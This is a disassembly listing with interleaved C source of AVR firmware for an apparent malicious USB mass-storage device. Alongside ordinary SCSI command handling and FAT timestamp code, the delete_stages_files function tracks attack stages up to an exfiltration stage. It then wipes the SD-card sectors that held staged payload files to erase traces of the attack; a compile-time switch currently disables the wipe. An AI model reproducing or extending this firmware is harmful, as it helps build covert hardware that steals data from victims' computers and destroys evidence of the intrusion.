    4dee:	23 c0       	rjmp	.+70     	; 0x4e36 <SCSI_DecodeSCSICommand+0x90>
    4df0:	cf 01       	movw	r24, r30
            break;
    4df2:	07 df       	rcall	.-498    	; 0x4c02 <SCSI_Command_Read_Capacity_10>
        case SCSI_CMD_SEND_DIAGNOSTIC:
            CommandSuccess = SCSI_Command_Send_Diagnostic(MSInterfaceInfo);
    4df4:	20 c0       	rjmp	.+64     	; 0x4e36 <SCSI_DecodeSCSICommand+0x90>
    4df6:	cf 01       	movw	r24, r30
            break;
    4df8:	50 df       	rcall	.-352    	; 0x4c9a <SCSI_Command_Send_Diagnostic>
        case SCSI_CMD_WRITE_10:
            CommandSuccess = SCSI_Command_ReadWrite_10(MSInterfaceInfo, DATA_WRITE);
    4dfa:	1d c0       	rjmp	.+58     	; 0x4e36 <SCSI_DecodeSCSICommand+0x90>
    4dfc:	60 e0       	ldi	r22, 0x00	; 0
    4dfe:	cf 01       	movw	r24, r30
            break;
    4e00:	76 df       	rcall	.-276    	; 0x4cee <SCSI_Command_ReadWrite_10>
        case SCSI_CMD_READ_10:
            CommandSuccess = SCSI_Command_ReadWrite_10(MSInterfaceInfo, DATA_READ);
    4e02:	19 c0       	rjmp	.+50     	; 0x4e36 <SCSI_DecodeSCSICommand+0x90>
    4e04:	61 e0       	ldi	r22, 0x01	; 1
    4e06:	cf 01       	movw	r24, r30
            break;
    4e08:	72 df       	rcall	.-284    	; 0x4cee <SCSI_Command_ReadWrite_10>
        case SCSI_CMD_MODE_SENSE_6:
            CommandSuccess = SCSI_Command_ModeSense_6(MSInterfaceInfo);
    4e0a:	15 c0       	rjmp	.+42     	; 0x4e36 <SCSI_DecodeSCSICommand+0x90>
    4e0c:	cf 01       	movw	r24, r30
    4e0e:	49 de       	rcall	.-878    	; 0x4aa2 <SCSI_Command_ModeSense_6>
            break;
    4e10:	12 c0       	rjmp	.+36     	; 0x4e36 <SCSI_DecodeSCSICommand+0x90>
        case SCSI_CMD_TEST_UNIT_READY:
        case SCSI_CMD_PREVENT_ALLOW_MEDIUM_REMOVAL:
        case SCSI_CMD_VERIFY_10:
            /* These commands should just succeed, no handling required */
            CommandSuccess = true;
            MSInterfaceInfo->State.CommandBlock.DataTransferLength = 0;
    4e12:	14 8a       	std	Z+20, r1	; 0x14
    4e14:	15 8a       	std	Z+21, r1	; 0x15
    4e16:	16 8a       	std	Z+22, r1	; 0x16
    4e18:	17 8a       	std	Z+23, r1	; 0x17
        case SCSI_CMD_START_STOP_UNIT:
        case SCSI_CMD_TEST_UNIT_READY:
        case SCSI_CMD_PREVENT_ALLOW_MEDIUM_REMOVAL:
        case SCSI_CMD_VERIFY_10:
            /* These commands should just succeed, no handling required */
            CommandSuccess = true;
    4e1a:	81 e0       	ldi	r24, 0x01	; 1
            MSInterfaceInfo->State.CommandBlock.DataTransferLength = 0;
            break;
    4e1c:	0c c0       	rjmp	.+24     	; 0x4e36 <SCSI_DecodeSCSICommand+0x90>
        default:
            /* Update the SENSE key to reflect the invalid command */
            SCSI_SET_SENSE(SCSI_SENSE_KEY_ILLEGAL_REQUEST,
    4e1e:	ea e5       	ldi	r30, 0x5A	; 90
    4e20:	f1 e0       	ldi	r31, 0x01	; 1
    4e22:	80 81       	ld	r24, Z
    4e24:	80 7f       	andi	r24, 0xF0	; 240
    4e26:	85 60       	ori	r24, 0x05	; 5
    4e28:	80 83       	st	Z, r24
    4e2a:	e8 e5       	ldi	r30, 0x58	; 88
    4e2c:	f1 e0       	ldi	r31, 0x01	; 1
    4e2e:	80 e2       	ldi	r24, 0x20	; 32
    4e30:	84 87       	std	Z+12, r24	; 0x0c
    4e32:	15 86       	std	Z+13, r1	; 0x0d
 *
 *  \return Boolean \c true if the command completed successfully, \c false otherwise
 */
bool SCSI_DecodeSCSICommand(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
    bool CommandSuccess = false;
    4e34:	80 e0       	ldi	r24, 0x00	; 0
                           SCSI_ASENSEQ_NO_QUALIFIER);
            break;
    }

    /* Check if command was successfully processed */
    if (CommandSuccess)
    4e36:	88 23       	and	r24, r24
    4e38:	59 f0       	breq	.+22     	; 0x4e50 <SCSI_DecodeSCSICommand+0xaa>
    {
        SCSI_SET_SENSE(SCSI_SENSE_KEY_GOOD,
    4e3a:	ea e5       	ldi	r30, 0x5A	; 90
    4e3c:	f1 e0       	ldi	r31, 0x01	; 1
    4e3e:	80 81       	ld	r24, Z
    4e40:	80 7f       	andi	r24, 0xF0	; 240
    4e42:	80 83       	st	Z, r24
    4e44:	e8 e5       	ldi	r30, 0x58	; 88
    4e46:	f1 e0       	ldi	r31, 0x01	; 1
    4e48:	14 86       	std	Z+12, r1	; 0x0c
    4e4a:	15 86       	std	Z+13, r1	; 0x0d
                       SCSI_ASENSE_NO_ADDITIONAL_INFORMATION,
                       SCSI_ASENSEQ_NO_QUALIFIER);

        return true;
    4e4c:	81 e0       	ldi	r24, 0x01	; 1
    4e4e:	08 95       	ret
    }

    return false;
    4e50:	80 e0       	ldi	r24, 0x00	; 0
}
    4e52:	08 95       	ret

00004e54 <delete_stages_files>:
bool bootscinit = false;

uint8_t rwbff[512];

void delete_stages_files(void)
{
    4e54:	cf 93       	push	r28
#define NO_DEL_FILES_AFTER_ATTACK

    static uint16_t cnt = 0xFFFF;
    static uint16_t cnt_print = 0;

    if (eppr_vars.deleted_files)
    4e56:	80 91 84 09 	lds	r24, 0x0984	; 0x800984 <eppr_vars+0x2>
    4e5a:	81 11       	cpse	r24, r1
    4e5c:	b3 c0       	rjmp	.+358    	; 0x4fc4 <delete_stages_files+0x170>
    {
        return;
    }

    if (eppr_vars.curr_stage < STAG_EXFILL)
    4e5e:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    4e62:	82 30       	cpi	r24, 0x02	; 2
    4e64:	08 f4       	brcc	.+2      	; 0x4e68 <delete_stages_files+0x14>
    4e66:	ae c0       	rjmp	.+348    	; 0x4fc4 <delete_stages_files+0x170>
    {
        return;
    }

    if (cnt-- != 0)
    4e68:	80 91 7a 01 	lds	r24, 0x017A	; 0x80017a <cnt.5025>
    4e6c:	90 91 7b 01 	lds	r25, 0x017B	; 0x80017b <cnt.5025+0x1>
    4e70:	9c 01       	movw	r18, r24
    4e72:	21 50       	subi	r18, 0x01	; 1
    4e74:	31 09       	sbc	r19, r1
    4e76:	30 93 7b 01 	sts	0x017B, r19	; 0x80017b <cnt.5025+0x1>
    4e7a:	20 93 7a 01 	sts	0x017A, r18	; 0x80017a <cnt.5025>
    4e7e:	89 2b       	or	r24, r25
    4e80:	09 f0       	breq	.+2      	; 0x4e84 <delete_stages_files+0x30>
    4e82:	a0 c0       	rjmp	.+320    	; 0x4fc4 <delete_stages_files+0x170>
    {
        return;
    }

    if (eppr_vars.curr_sector_stage2_deleted <= STAGE2_END_SECTOR)
    4e84:	80 91 87 09 	lds	r24, 0x0987	; 0x800987 <eppr_vars+0x5>
    4e88:	90 91 88 09 	lds	r25, 0x0988	; 0x800988 <eppr_vars+0x6>
    4e8c:	88 33       	cpi	r24, 0x38	; 56
    4e8e:	99 4a       	sbci	r25, 0xA9	; 169
    4e90:	88 f5       	brcc	.+98     	; 0x4ef4 <delete_stages_files+0xa0>
    {
        if (cnt_print == 0)
    4e92:	80 91 75 09 	lds	r24, 0x0975	; 0x800975 <cnt_print.5026>
    4e96:	90 91 76 09 	lds	r25, 0x0976	; 0x800976 <cnt_print.5026+0x1>
    4e9a:	89 2b       	or	r24, r25
    4e9c:	d1 f4       	brne	.+52     	; 0x4ed2 <delete_stages_files+0x7e>
        {
            ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4e9e:	cf b7       	in	r28, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    4ea0:	f8 94       	cli
    4ea2:	81 e0       	ldi	r24, 0x01	; 1
    4ea4:	13 c0       	rjmp	.+38     	; 0x4ecc <delete_stages_files+0x78>
            {
                printf("deleting sector STAGE2: %u\r\n",
                       (unsigned int) (STAGE2_START_SECTOR + eppr_vars.curr_sector_stage2_deleted));
    4ea6:	80 91 87 09 	lds	r24, 0x0987	; 0x800987 <eppr_vars+0x5>
    4eaa:	90 91 88 09 	lds	r25, 0x0988	; 0x800988 <eppr_vars+0x6>
    {
        if (cnt_print == 0)
        {
            ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
            {
                printf("deleting sector STAGE2: %u\r\n",
    4eae:	88 50       	subi	r24, 0x08	; 8
    4eb0:	98 45       	sbci	r25, 0x58	; 88
    4eb2:	9f 93       	push	r25
    4eb4:	8f 93       	push	r24
    4eb6:	8e e3       	ldi	r24, 0x3E	; 62
    4eb8:	95 e0       	ldi	r25, 0x05	; 5
    4eba:	9f 93       	push	r25
    4ebc:	8f 93       	push	r24
    4ebe:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>

    if (eppr_vars.curr_sector_stage2_deleted <= STAGE2_END_SECTOR)
    {
        if (cnt_print == 0)
        {
            ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4ec2:	80 e0       	ldi	r24, 0x00	; 0
    4ec4:	0f 90       	pop	r0
    4ec6:	0f 90       	pop	r0
    4ec8:	0f 90       	pop	r0
    4eca:	0f 90       	pop	r0
    4ecc:	81 11       	cpse	r24, r1
    4ece:	eb cf       	rjmp	.-42     	; 0x4ea6 <delete_stages_files+0x52>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    4ed0:	cf bf       	out	0x3f, r28	; 63
        }
#ifndef NO_DEL_FILES_AFTER_ATTACK
        mmc_disk_sector_memset(f,
                               STAGE2_START_SECTOR + eppr_vars.curr_sector_stage2_deleted);
#endif
        ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4ed2:	cf b7       	in	r28, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    4ed4:	f8 94       	cli
    4ed6:	81 e0       	ldi	r24, 0x01	; 1
    4ed8:	0a c0       	rjmp	.+20     	; 0x4eee <delete_stages_files+0x9a>
        {
            eppr_vars.curr_sector_stage2_deleted++;
    4eda:	e2 e8       	ldi	r30, 0x82	; 130
    4edc:	f9 e0       	ldi	r31, 0x09	; 9
    4ede:	85 81       	ldd	r24, Z+5	; 0x05
    4ee0:	96 81       	ldd	r25, Z+6	; 0x06
    4ee2:	01 96       	adiw	r24, 0x01	; 1
    4ee4:	96 83       	std	Z+6, r25	; 0x06
    4ee6:	85 83       	std	Z+5, r24	; 0x05
            save_eepr();
    4ee8:	0e 94 6d 03 	call	0x6da	; 0x6da <save_eepr>
        }
#ifndef NO_DEL_FILES_AFTER_ATTACK
        mmc_disk_sector_memset(f,
                               STAGE2_START_SECTOR + eppr_vars.curr_sector_stage2_deleted);
#endif
        ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4eec:	80 e0       	ldi	r24, 0x00	; 0
    4eee:	81 11       	cpse	r24, r1
    4ef0:	f4 cf       	rjmp	.-24     	; 0x4eda <delete_stages_files+0x86>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    4ef2:	cf bf       	out	0x3f, r28	; 63
            save_eepr();
        }

    }

    if (eppr_vars.curr_sector_stage1_deleted <= STAGE1_END_SECTOR)
    4ef4:	80 91 85 09 	lds	r24, 0x0985	; 0x800985 <eppr_vars+0x3>
    4ef8:	90 91 86 09 	lds	r25, 0x0986	; 0x800986 <eppr_vars+0x4>
    4efc:	8f 36       	cpi	r24, 0x6F	; 111
    4efe:	91 40       	sbci	r25, 0x01	; 1
    4f00:	88 f5       	brcc	.+98     	; 0x4f64 <delete_stages_files+0x110>
    {
        if (cnt_print == 0)
    4f02:	80 91 75 09 	lds	r24, 0x0975	; 0x800975 <cnt_print.5026>
    4f06:	90 91 76 09 	lds	r25, 0x0976	; 0x800976 <cnt_print.5026+0x1>
    4f0a:	89 2b       	or	r24, r25
    4f0c:	d1 f4       	brne	.+52     	; 0x4f42 <delete_stages_files+0xee>
        {
            ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4f0e:	cf b7       	in	r28, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    4f10:	f8 94       	cli
    4f12:	81 e0       	ldi	r24, 0x01	; 1
    4f14:	13 c0       	rjmp	.+38     	; 0x4f3c <delete_stages_files+0xe8>
            {
                printf("deleting sector STAGE1: %u\r\n",
                       (unsigned int) (STAGE1_START_SECTOR + eppr_vars.curr_sector_stage1_deleted));
    4f16:	80 91 85 09 	lds	r24, 0x0985	; 0x800985 <eppr_vars+0x3>
    4f1a:	90 91 86 09 	lds	r25, 0x0986	; 0x800986 <eppr_vars+0x4>
    {
        if (cnt_print == 0)
        {
            ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
            {
                printf("deleting sector STAGE1: %u\r\n",
    4f1e:	80 5c       	subi	r24, 0xC0	; 192
    4f20:	9f 4f       	sbci	r25, 0xFF	; 255
    4f22:	9f 93       	push	r25
    4f24:	8f 93       	push	r24
    4f26:	8b e5       	ldi	r24, 0x5B	; 91
    4f28:	95 e0       	ldi	r25, 0x05	; 5
    4f2a:	9f 93       	push	r25
    4f2c:	8f 93       	push	r24
    4f2e:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>

    if (eppr_vars.curr_sector_stage1_deleted <= STAGE1_END_SECTOR)
    {
        if (cnt_print == 0)
        {
            ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4f32:	80 e0       	ldi	r24, 0x00	; 0
    4f34:	0f 90       	pop	r0
    4f36:	0f 90       	pop	r0
    4f38:	0f 90       	pop	r0
    4f3a:	0f 90       	pop	r0
    4f3c:	81 11       	cpse	r24, r1
    4f3e:	eb cf       	rjmp	.-42     	; 0x4f16 <delete_stages_files+0xc2>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    4f40:	cf bf       	out	0x3f, r28	; 63
        }
#ifndef NO_DEL_FILES_AFTER_ATTACK
        mmc_disk_sector_memset(f,
                               STAGE1_START_SECTOR + eppr_vars.curr_sector_stage1_deleted);
#endif
        ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4f42:	cf b7       	in	r28, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    4f44:	f8 94       	cli
    4f46:	81 e0       	ldi	r24, 0x01	; 1
    4f48:	0a c0       	rjmp	.+20     	; 0x4f5e <delete_stages_files+0x10a>
        {
            eppr_vars.curr_sector_stage1_deleted++;
    4f4a:	e2 e8       	ldi	r30, 0x82	; 130
    4f4c:	f9 e0       	ldi	r31, 0x09	; 9
    4f4e:	83 81       	ldd	r24, Z+3	; 0x03
    4f50:	94 81       	ldd	r25, Z+4	; 0x04
    4f52:	01 96       	adiw	r24, 0x01	; 1
    4f54:	94 83       	std	Z+4, r25	; 0x04
    4f56:	83 83       	std	Z+3, r24	; 0x03
            save_eepr();
    4f58:	0e 94 6d 03 	call	0x6da	; 0x6da <save_eepr>
        }
#ifndef NO_DEL_FILES_AFTER_ATTACK
        mmc_disk_sector_memset(f,
                               STAGE1_START_SECTOR + eppr_vars.curr_sector_stage1_deleted);
#endif
        ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4f5c:	80 e0       	ldi	r24, 0x00	; 0
    4f5e:	81 11       	cpse	r24, r1
    4f60:	f4 cf       	rjmp	.-24     	; 0x4f4a <delete_stages_files+0xf6>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    4f62:	cf bf       	out	0x3f, r28	; 63
            eppr_vars.curr_sector_stage1_deleted++;
            save_eepr();
        }
    }

    if (cnt_print == 0)
    4f64:	80 91 75 09 	lds	r24, 0x0975	; 0x800975 <cnt_print.5026>
    4f68:	90 91 76 09 	lds	r25, 0x0976	; 0x800976 <cnt_print.5026+0x1>
    4f6c:	89 2b       	or	r24, r25
    4f6e:	31 f4       	brne	.+12     	; 0x4f7c <delete_stages_files+0x128>
    {
        cnt_print = 0x15;
    4f70:	85 e1       	ldi	r24, 0x15	; 21
    4f72:	90 e0       	ldi	r25, 0x00	; 0
    4f74:	90 93 76 09 	sts	0x0976, r25	; 0x800976 <cnt_print.5026+0x1>
    4f78:	80 93 75 09 	sts	0x0975, r24	; 0x800975 <cnt_print.5026>
    }
    cnt_print--;
    4f7c:	80 91 75 09 	lds	r24, 0x0975	; 0x800975 <cnt_print.5026>
    4f80:	90 91 76 09 	lds	r25, 0x0976	; 0x800976 <cnt_print.5026+0x1>
    4f84:	01 97       	sbiw	r24, 0x01	; 1
    4f86:	90 93 76 09 	sts	0x0976, r25	; 0x800976 <cnt_print.5026+0x1>
    4f8a:	80 93 75 09 	sts	0x0975, r24	; 0x800975 <cnt_print.5026>

    if (eppr_vars.curr_sector_stage2_deleted >= STAGE2_END_SECTOR
    4f8e:	80 91 87 09 	lds	r24, 0x0987	; 0x800987 <eppr_vars+0x5>
    4f92:	90 91 88 09 	lds	r25, 0x0988	; 0x800988 <eppr_vars+0x6>
    4f96:	87 33       	cpi	r24, 0x37	; 55
    4f98:	99 4a       	sbci	r25, 0xA9	; 169
    4f9a:	a0 f0       	brcs	.+40     	; 0x4fc4 <delete_stages_files+0x170>
            && eppr_vars.curr_sector_stage1_deleted >= STAGE1_END_SECTOR)
    4f9c:	80 91 85 09 	lds	r24, 0x0985	; 0x800985 <eppr_vars+0x3>
    4fa0:	90 91 86 09 	lds	r25, 0x0986	; 0x800986 <eppr_vars+0x4>
    4fa4:	8e 36       	cpi	r24, 0x6E	; 110
    4fa6:	91 40       	sbci	r25, 0x01	; 1
    4fa8:	68 f0       	brcs	.+26     	; 0x4fc4 <delete_stages_files+0x170>
    {
        ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4faa:	cf b7       	in	r28, 0x3f	; 63
    return 1;
}

static __inline__ uint8_t __iCliRetVal(void)
{
    cli();
    4fac:	f8 94       	cli
    4fae:	81 e0       	ldi	r24, 0x01	; 1
    4fb0:	06 c0       	rjmp	.+12     	; 0x4fbe <delete_stages_files+0x16a>
        {
            eppr_vars.deleted_files = true;
    4fb2:	81 e0       	ldi	r24, 0x01	; 1
    4fb4:	80 93 84 09 	sts	0x0984, r24	; 0x800984 <eppr_vars+0x2>
            save_eepr();
    4fb8:	0e 94 6d 03 	call	0x6da	; 0x6da <save_eepr>
    cnt_print--;

    if (eppr_vars.curr_sector_stage2_deleted >= STAGE2_END_SECTOR
            && eppr_vars.curr_sector_stage1_deleted >= STAGE1_END_SECTOR)
    {
        ATOMIC_BLOCK(ATOMIC_RESTORESTATE )
    4fbc:	80 e0       	ldi	r24, 0x00	; 0
    4fbe:	81 11       	cpse	r24, r1
    4fc0:	f8 cf       	rjmp	.-16     	; 0x4fb2 <delete_stages_files+0x15e>
    (void)__s;
}

static __inline__ void __iRestore(const  uint8_t *__s)
{
    SREG = *__s;
    4fc2:	cf bf       	out	0x3f, r28	; 63
        {
            eppr_vars.deleted_files = true;
            save_eepr();
        }
    }
}
    4fc4:	cf 91       	pop	r28
    4fc6:	08 95       	ret

00004fc8 <get_fattime>:
FIL File[1];        /* File object */

BYTE RtcOk;             /* RTC is available */

DWORD get_fattime (void)
{
    4fc8:	cf 93       	push	r28
    4fca:	df 93       	push	r29
    4fcc:	cd b7       	in	r28, 0x3d	; 61
    4fce:	de b7       	in	r29, 0x3e	; 62
    4fd0:	28 97       	sbiw	r28, 0x08	; 8
    4fd2:	0f b6       	in	r0, 0x3f	; 63
    4fd4:	f8 94       	cli
    4fd6:	de bf       	out	0x3e, r29	; 62
    4fd8:	0f be       	out	0x3f, r0	; 63
    4fda:	cd bf       	out	0x3d, r28	; 61
    RTC rtc;


    if (!RtcOk)
    4fdc:	80 91 e0 0b 	lds	r24, 0x0BE0	; 0x800be0 <RtcOk>
    4fe0:	88 23       	and	r24, r24
    4fe2:	09 f4       	brne	.+2      	; 0x4fe6 <get_fattime+0x1e>
    4fe4:	61 c0       	rjmp	.+194    	; 0x50a8 <get_fattime+0xe0>
    {
        return 0;
    }

    /* Get local time */
    rtc_gettime(&rtc);
    4fe6:	ce 01       	movw	r24, r28
    4fe8:	01 96       	adiw	r24, 0x01	; 1
    4fea:	d7 dc       	rcall	.-1618   	; 0x499a <rtc_gettime>

    /* Pack date and time into a DWORD variable */
    return    ((DWORD)(rtc.year - 1980) << 25)
    4fec:	49 81       	ldd	r20, Y+1	; 0x01
    4fee:	5a 81       	ldd	r21, Y+2	; 0x02
    4ff0:	4c 5b       	subi	r20, 0xBC	; 188
    4ff2:	57 40       	sbci	r21, 0x07	; 7
    4ff4:	60 e0       	ldi	r22, 0x00	; 0
    4ff6:	70 e0       	ldi	r23, 0x00	; 0
    4ff8:	03 2e       	mov	r0, r19
    4ffa:	39 e1       	ldi	r19, 0x19	; 25
    4ffc:	44 0f       	add	r20, r20
    4ffe:	55 1f       	adc	r21, r21
    5000:	66 1f       	adc	r22, r22
    5002:	77 1f       	adc	r23, r23
    5004:	3a 95       	dec	r19
    5006:	d1 f7       	brne	.-12     	; 0x4ffc <get_fattime+0x34>
    5008:	30 2d       	mov	r19, r0
              | ((DWORD)rtc.month << 21)
    500a:	8b 81       	ldd	r24, Y+3	; 0x03
    500c:	90 e0       	ldi	r25, 0x00	; 0
    500e:	a0 e0       	ldi	r26, 0x00	; 0
    5010:	b0 e0       	ldi	r27, 0x00	; 0
    5012:	07 2e       	mov	r0, r23
    5014:	75 e1       	ldi	r23, 0x15	; 21
    5016:	88 0f       	add	r24, r24
    5018:	99 1f       	adc	r25, r25
    501a:	aa 1f       	adc	r26, r26
    501c:	bb 1f       	adc	r27, r27
    501e:	7a 95       	dec	r23
    5020:	d1 f7       	brne	.-12     	; 0x5016 <get_fattime+0x4e>
    5022:	70 2d       	mov	r23, r0
    5024:	48 2b       	or	r20, r24
    5026:	59 2b       	or	r21, r25
    5028:	6a 2b       	or	r22, r26
    502a:	7b 2b       	or	r23, r27
              | ((DWORD)rtc.mday << 16)
    502c:	8c 81       	ldd	r24, Y+4	; 0x04
    502e:	90 e0       	ldi	r25, 0x00	; 0
    5030:	a0 e0       	ldi	r26, 0x00	; 0
    5032:	b0 e0       	ldi	r27, 0x00	; 0
    5034:	dc 01       	movw	r26, r24
    5036:	99 27       	eor	r25, r25
    5038:	88 27       	eor	r24, r24
    503a:	48 2b       	or	r20, r24
    503c:	59 2b       	or	r21, r25
    503e:	6a 2b       	or	r22, r26
    5040:	7b 2b       	or	r23, r27
              | ((DWORD)rtc.hour << 11)
    5042:	8e 81       	ldd	r24, Y+6	; 0x06
    5044:	90 e0       	ldi	r25, 0x00	; 0
    5046:	a0 e0       	ldi	r26, 0x00	; 0
    5048:	b0 e0       	ldi	r27, 0x00	; 0
    504a:	07 2e       	mov	r0, r23
    504c:	7b e0       	ldi	r23, 0x0B	; 11
    504e:	88 0f       	add	r24, r24
    5050:	99 1f       	adc	r25, r25
    5052:	aa 1f       	adc	r26, r26
    5054:	bb 1f       	adc	r27, r27
    5056:	7a 95       	dec	r23
    5058:	d1 f7       	brne	.-12     	; 0x504e <get_fattime+0x86>
    505a:	70 2d       	mov	r23, r0
    505c:	48 2b       	or	r20, r24
    505e:	59 2b       	or	r21, r25
    5060:	6a 2b       	or	r22, r26
    5062:	7b 2b       	or	r23, r27
              | ((DWORD)rtc.min << 5)
    5064:	8f 81       	ldd	r24, Y+7	; 0x07
    5066:	90 e0       	ldi	r25, 0x00	; 0
    5068:	a0 e0       	ldi	r26, 0x00	; 0
    506a:	b0 e0       	ldi	r27, 0x00	; 0
    506c:	88 0f       	add	r24, r24
    506e:	99 1f       	adc	r25, r25
    5070:	aa 1f       	adc	r26, r26
    5072:	bb 1f       	adc	r27, r27
    5074:	88 0f       	add	r24, r24
    5076:	99 1f       	adc	r25, r25
    5078:	aa 1f       	adc	r26, r26
    507a:	bb 1f       	adc	r27, r27
    507c:	88 0f       	add	r24, r24
    507e:	99 1f       	adc	r25, r25
    5080:	aa 1f       	adc	r26, r26
    5082:	bb 1f       	adc	r27, r27
    5084:	88 0f       	add	r24, r24
    5086:	99 1f       	adc	r25, r25
    5088:	aa 1f       	adc	r26, r26
    508a:	bb 1f       	adc	r27, r27
    508c:	88 0f       	add	r24, r24
    508e:	99 1f       	adc	r25, r25
    5090:	aa 1f       	adc	r26, r26
    5092:	bb 1f       	adc	r27, r27
    5094:	84 2b       	or	r24, r20
    5096:	95 2b       	or	r25, r21
    5098:	a6 2b       	or	r26, r22
    509a:	b7 2b       	or	r27, r23
              | ((DWORD)rtc.sec >> 1);
    509c:	28 85       	ldd	r18, Y+8	; 0x08
    509e:	26 95       	lsr	r18

    /* Get local time */
    rtc_gettime(&rtc);

    /* Pack date and time into a DWORD variable */
    return    ((DWORD)(rtc.year - 1980) << 25)
    50a0:	bc 01       	movw	r22, r24
    50a2:	cd 01       	movw	r24, r26
    50a4:	62 2b       	or	r22, r18
    50a6:	03 c0       	rjmp	.+6      	; 0x50ae <get_fattime+0xe6>
    RTC rtc;


    if (!RtcOk)
    {
        return 0;
    50a8:	60 e0       	ldi	r22, 0x00	; 0
    50aa:	70 e0       	ldi	r23, 0x00	; 0
    50ac:	cb 01       	movw	r24, r22
              | ((DWORD)rtc.month << 21)
              | ((DWORD)rtc.mday << 16)
              | ((DWORD)rtc.hour << 11)
              | ((DWORD)rtc.min << 5)
              | ((DWORD)rtc.sec >> 1);
}
    50ae:	28 96       	adiw	r28, 0x08	; 8
    50b0:	0f b6       	in	r0, 0x3f	; 63
    50b2:	f8 94       	cli
    50b4:	de bf       	out	0x3e, r29	; 62
    50b6:	0f be       	out	0x3f, r0	; 63
    50b8:	cd bf       	out	0x3d, r28	; 61
    50ba:	df 91       	pop	r29
    50bc:	cf 91       	pop	r28
    50be:	08 95       	ret

000050c0 <sdcard_create_sdload_times_file>:


bool sdcard_create_sdload_times_file(void)
{
    50c0:	df 92       	push	r13
    50c2:	ef 92       	push	r14
    50c4:	ff 92       	push	r15
    50c6:	0f 93       	push	r16
    50c8:	1f 93       	push	r17
    50ca:	cf 93       	push	r28
    50cc:	df 93       	push	r29
    50ce:	cd b7       	in	r28, 0x3d	; 61
    50d0:	de b7       	in	r29, 0x3e	; 62
    50d2:	c7 54       	subi	r28, 0x47	; 71
    50d4:	d3 40       	sbci	r29, 0x03	; 3
    50d6:	0f b6       	in	r0, 0x3f	; 63
    50d8:	f8 94       	cli
    50da:	de bf       	out	0x3e, r29	; 62
    50dc:	0f be       	out	0x3f, r0	; 63
    50de:	cd bf       	out	0x3d, r28	; 61
#define FILE_NAM_TEMPLATE "DRG_X%02X.TXT"
    char file_name[120] = { 0 };
    50e0:	88 e7       	ldi	r24, 0x78	; 120
    50e2:	fe 01       	movw	r30, r28
    50e4:	31 96       	adiw	r30, 0x01	; 1
    50e6:	df 01       	movw	r26, r30
    50e8:	98 2f       	mov	r25, r24
    50ea:	1d 92       	st	X+, r1
    50ec:	9a 95       	dec	r25
    50ee:	e9 f7       	brne	.-6      	; 0x50ea <sdcard_create_sdload_times_file+0x2a>
    FATFS fs;
    char line[120] = { 0 };
    50f0:	e5 55       	subi	r30, 0x55	; 85
    50f2:	fd 4f       	sbci	r31, 0xFD	; 253
    50f4:	df 01       	movw	r26, r30
    50f6:	1d 92       	st	X+, r1
    50f8:	8a 95       	dec	r24
    50fa:	e9 f7       	brne	.-6      	; 0x50f6 <sdcard_create_sdload_times_file+0x36>
    FIL file1;
    UINT bw;
    FRESULT fr;
    bool retf = false;

    printf("mounting fs\r\n");
    50fc:	88 e7       	ldi	r24, 0x78	; 120
    50fe:	95 e0       	ldi	r25, 0x05	; 5
    5100:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    fr = f_mount(&fs, "", 0);
    5104:	40 e0       	ldi	r20, 0x00	; 0
    5106:	6e e0       	ldi	r22, 0x0E	; 14
    5108:	78 e0       	ldi	r23, 0x08	; 8
    510a:	ce 01       	movw	r24, r28
    510c:	87 58       	subi	r24, 0x87	; 135
    510e:	9f 4f       	sbci	r25, 0xFF	; 255
    5110:	0e 94 66 15 	call	0x2acc	; 0x2acc <f_mount>
    if (fr == FR_OK)
    5114:	81 11       	cpse	r24, r1
    5116:	e9 c0       	rjmp	.+466    	; 0x52ea <sdcard_create_sdload_times_file+0x22a>
    {
        printf("mount fs success \r\n");
    5118:	85 e8       	ldi	r24, 0x85	; 133
    511a:	95 e0       	ldi	r25, 0x05	; 5
    511c:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>

        sprintf(file_name, FILE_NAM_TEMPLATE, eeprom_read_byte((uint8_t*)0x69));
    5120:	89 e6       	ldi	r24, 0x69	; 105
    5122:	90 e0       	ldi	r25, 0x00	; 0
    5124:	0e 94 a2 3c 	call	0x7944	; 0x7944 <eeprom_read_byte>
    5128:	1f 92       	push	r1
    512a:	8f 93       	push	r24
    512c:	0f 2e       	mov	r0, r31
    512e:	f8 e9       	ldi	r31, 0x98	; 152
    5130:	ef 2e       	mov	r14, r31
    5132:	f5 e0       	ldi	r31, 0x05	; 5
    5134:	ff 2e       	mov	r15, r31
    5136:	f0 2d       	mov	r31, r0
    5138:	ff 92       	push	r15
    513a:	ef 92       	push	r14
    513c:	8e 01       	movw	r16, r28
    513e:	0f 5f       	subi	r16, 0xFF	; 255
    5140:	1f 4f       	sbci	r17, 0xFF	; 255
    5142:	1f 93       	push	r17
    5144:	0f 93       	push	r16
    5146:	0e 94 b4 39 	call	0x7368	; 0x7368 <sprintf>
        printf("deleting last load file: %s\r\n", file_name);
    514a:	1f 93       	push	r17
    514c:	0f 93       	push	r16
